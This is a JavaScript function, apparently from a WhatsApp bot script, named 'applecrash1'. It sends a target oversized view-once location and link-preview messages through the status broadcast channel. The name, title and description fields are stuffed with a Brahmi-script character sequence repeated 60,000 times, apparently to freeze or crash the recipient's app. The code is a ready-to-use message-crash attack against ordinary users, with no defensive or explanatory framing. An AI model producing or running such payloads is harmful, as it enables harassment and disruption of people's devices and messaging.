async function applecrash1(target, mention) {
const s = "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessage = {
         degreesLatitude: 11.11,
         degreesLongitude: -11.11,
         name: "𝗭𝗶𝗲𝗲 𝗱𝗲𝗹 𝗥𝗲𝘆... 桜🌸" + "𑇂𑆵𑆴𑆿".repeat(60000),
         url: "https://t.me/pherine",
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "🌸" + s,
            matchedText: "Hallo",
            description: "𑇂𑆵𑆴𑆿".repeat(60000),
            title: "Me Xata" + "𑇂𑆵𑆴𑆿".repeat(60000),
            previewType: "NONE",
            jpegThumbnail: "",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      await Angel.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await Angel.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
   } catch (err) {
   }
};


//=======[ END GAUSAH DITAMBAH DISINI ]======\\
